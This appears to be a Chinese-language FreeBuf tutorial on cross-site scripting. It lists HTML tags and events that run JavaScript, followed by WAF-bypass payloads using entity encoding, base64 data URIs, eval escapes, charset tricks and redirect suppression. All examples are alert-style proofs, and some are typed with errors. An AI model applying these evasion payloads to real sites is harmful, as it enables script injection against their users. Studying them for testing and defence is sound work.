@@ -1,0 +1,53 @@
+XSS让我们在渗透中有无限的可能，只要你发挥你的想象。 引用一位前辈总结的很贴切的一句话——“XSS使整个WEB体系变得具有灵性” 。
+网上关于XSS的教程数不胜数，转载来转载去的，就是那么些Payload，可能看的人晕晕的不知所以然。而且还有很多Payload就算把其中的HTML代码闭合后写在自己的前端中，都不一定触发，因为很多老的标签和事件都已经被W3C给废弃了。本文首先给大家总结一下目前通用可以拿来构造XSS的HTML标签和一些标签事件，然后再给大家讲述一些绕过的技巧，教你在么构造出属于你自己渗透时真正需要的Exp。
+可以成功执行的标签
+<a href="javascript:confirm('a')" >1</a >
+a标签 当点击时才会触发
+<imgsrc="#"onclick="javascript:alert('img:onclick')"onerror="javascript:alert('img:onerror')"onload="javascript:alert('img:onload')"> <!--src加伪协议js代码不能触发--> <videosrc="#"onclick="javascript:alert('video:onclick')"onerror="javascript:alert('video:onerror')"onload="javascript:alert('video:onload')"></video> <audiosrc="#"onclick="javascript:alert('audio:onclick')"onerror="javascript:alert('audio:onerror')"onload="javascript:alert('audio:onload')"></audio>
+<!--这些标签中src加伪协议js代码不能触发，IE8以前的时候可以-->
+img、video、audio标签 onclick:点击触发 onerror:当src加载不出来时触发 onload:当src加载完毕触发
+<iframe src= "javascript:alert('iframe')" width = "0" height = "0"/>
+iframe标签，写入后网页加载自动执行
+<form action= "Javascript:alert('from_action0')"> <input type= "submit" formaction=" JaVaScript:alert('from_action2')"> <input type= "image" formaction=" JaVaScript:alert('from_action1')"> <input type ="text" onchange ="JaVaScript:alert('from_action3')">
+在表单中一些标签，前三个都要点击事件触发，最后一个是得到改变内容时触发
+<a onmouseover= "javascript:alert('a_onmouseover')">12</ a> <svg onload=" javascript:alert('svg')"></svg > <body onload= "javascript:alert('body')"></body> <select autofocus onfocus="javascript:alert('select' )"></select> <textarea autofocus onfocus="javascript:alert('textarea' )"></textarea> <keygen autofocus onfocus="javascript:alert('keygen' )"></keygen> <audio><source onerror="javascript:alert('source')"></ audio>
+一些事件标签 要对应的事件发生可以触发 加上autofocus可以自动触发
+目前整理出来在各个浏览器通用的就是这些 以后会持续更新 可以关注我的博客或者DX安全团队
+一些绕过姿势
+首先，有一些脚本小子可能还不知道什么是exp，所谓exp就是一个精心构造可以配合或者绕过WAF成功触发XSS的一段代码，网上那些一发就是一大段的Payload可能到你那里就不合适了，因为Exp是需要针对性构造的。
+想要写出一个能触发的Exp，需要不停的探测输入于输出，推测WAF过滤规则，一般都会先输入" ' / # on < script > 等特殊字符，然后到输出点，查看是否可以正常输出，如果输入<>还正常输出了，那么有可能是被实体编码了，所以最好不要在网页中看或者审核元素看 应该右键查看源代码进行定位，这才是最好的办法，当然你也可以写一些小插件，都是很Nice的。对于<>被过滤实体编码的可以试试一些on事件,不行就看看下面的一些姿势吧！
+百分再百分
+看了标题是不是很疑惑，什么百分又百分，难道是百分百绕过？美滋滋？哈哈 我就是内标题党一次。
+所谓百分再百分，就是把%给url编码成%25 如果在后台对参数有再次进行urldecode，或者输出时有urldecode那么就可以绕过WAF，所以各位在造轮子，千万小心画蛇添足
+Base64编码绕过
+有时候真的这么绕WAF不拦截你的<>"的时候，拦截script、还有触发事件如onxxxx的时候，不妨试试Base64编码来绕过
+譬如<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+">
+把关键的XSS语句转化成base64来绕
+HTML实体编码的利用绕过waf
+记得以前一个案例，我用PHP按照记忆还原了一下 大概代码是这样的
+<a href=" <?=$_GET['localurl']; ?>" ></a> 不过对输入的参数过滤的很严格 看到有on script "等等敏感词语就直接exit了 所以什么构造alealertrt("X")利用过滤什么都是无效的。这里就可以利用实体编码。实体编码明明是一种防止XSS的办法吗为什么会被拿来绕过WAF呢，很多朋友可能就有所疑惑。实体编码一开始是为了避免譬如在你的双引号中要输入数据中包括双引号导致浏览器把你输入的引号当作上一个引号的姐妹标签而异常闭合而提出的，当时依然可以构造XSS 如下语句是可以在各大浏览器执行的
+<ahref='javascript:alert&#40;&#39;123&#39;&#41;'>Hello</a> <ahref="j&#97;vascript:alert&#40;'123'&#41;">Hello</a> <a href= "j&#97;vascript:alert&#0000040; '123'&#41;">Hello</a> <ahref="javascript:alert('123')">Hello</a>
+tip其实在标签内的所有伪协议JS代码都是可以不用用双引号引起来的。
+加上eval函数后甚至可以是这样的（eval认识\x十六进制 \八进制 \uunicode码 ）记得把这些编码用引号引起来
+<a href= "j &#97; vascript:eval(' &#97; \x6c\x65\x72\x74\x28\x22\x31\x22\x29')" > Hello </a>
+<a href= "j &#97; vascript:eval(' &#97; \u0091\x65\x72\x74\x28\x22\x31\x22\x29')" > Hello </a>
+<a href= "j &#97; vascript:eval(' &#97; \154\x65\x72\x74\x28\x22\x31\x22\x29')" > Hello </a>
+URL中有可以自定义控制前端编码
+这也是我时不时就会遇到的，譬如一个url如下：www.0d9y.cn/?charset='utf8'&...&xss=alert(/xss/)
+其实就能很简单的过WAF和任何函数过滤，原因很简单，你能控制charset，这时候用一些特殊的编码，编码中会有一些字符浏览器不识别， 然后把你的注入语句中关键词插入这个编码，就能很轻松的成功触发XSS。
+譬如ISO-2022-JP编码中的%1b%28%4Aurl编码，各大浏览器都是不认识的。
+宽字节绕过
+其实宽字节真的是老生常谈了，不过你们知道除了SQL注入，XSS也是可以利用的么，我在之前的文章说过宽字节的原理，所以你只要前端的编码是GKBK 那就可以用宽字节来绕过
+头部Base绕过
+这个挺冷门，听过但是我自己都还没遇到过，就是如果可以控制head中的base里的src 那么接下来所有的链接文件，都是会在开头加上base里的src链接的，在自己的网站上线一个符号的js文件。
+平时搞XSS可能会用得到的技巧
+Referer为空才可以访问
+有一些界面为了避免是别的地方跳转过来的 Referer必须为空，那什么情况Referer为空呢，第一是HTTPS协议到HTTP的协议，这时候Referer为空，或者用嵌入一个iframe用data加base64编码的方式，还可以用<meta name="referrer" content="never" >来达到referer为空
+注意返回的type类型
+返回什么样的类型决定了浏览器渲染还是不渲染你的XSS代码，只有返回的是XML或者HTML 才有可能会执行成功你的XSS代码，不过不同浏览器的特性不同，有一些返回的type类型可能也是可以执行XSS的，尤其是一些老的ie浏览器，具体可以看看freebuf之前发布过的一篇关于type和浏览器执行的表格。
+阻止浏览器302跳转
+总所总之，浏览器遇到302，301会直接跟进头部的跳转链接，可是有时候XSS界面就是这个跳转页面，这个跳转url是可控的，并且在浏览器显示如果浏览器没有正确跳转，请点击XXX的字样。那怎么样才可以让浏览器不自动跳转呢？一种就是把跳转的url端口设置低于80 譬如输入http://xss.com:0" onclick="alert(/1/) ,还可以使用CSP策略嵌入一个iframe 拿来配合CRLF进行XSS会很舒服
+注意头部的X-XSS-Protection
+这个东西就是让浏览器帮助一起防御XSS 为0则不帮助，为1则把可能含有的在代码中直接拿掉，还有一个是类型1;black这样的，就是在url地址直接把认为可能是xss的拿掉，所以有时候并不是你的XSS代码被服务器过滤了，还有可能是被浏览器拿走了
+凭空想想到的差不多就这些了，其实更多就是在实践中灵光一现，利用自己的基础知识来合理构造，构造payload不应该脱离实际，异想天开，基础一定要打好。博客也会发一些日常遇到的坑。
+*本文作者：0d9y，转载请注明来自FreeBuf.COM
